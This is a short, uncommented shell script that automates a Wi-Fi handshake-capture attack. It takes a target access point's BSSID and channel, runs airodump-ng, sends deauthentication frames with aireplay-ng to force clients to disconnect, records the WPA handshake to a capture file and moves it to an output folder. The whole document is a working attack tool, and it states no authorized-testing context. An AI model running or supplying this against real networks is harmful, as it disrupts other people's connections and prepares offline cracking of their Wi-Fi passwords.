interface=wlan0mon
bssid=$1
channel=$2
sudo timeout 4 airodump-ng --bssid "$bssid" -c "$channel" "$interface"
sudo aireplay-ng --deauth 10 -a "$bssid" "$interface"
sudo timeout 30 airodump-ng --bssid "$bssid" -c "$channel" --output-format cap --write-interval 5 -w "handshake" "$interface"
mv handshake-01.cap handshake.cap
sudo chmod 777 handshake.cap
mv handshake.cap ./output/


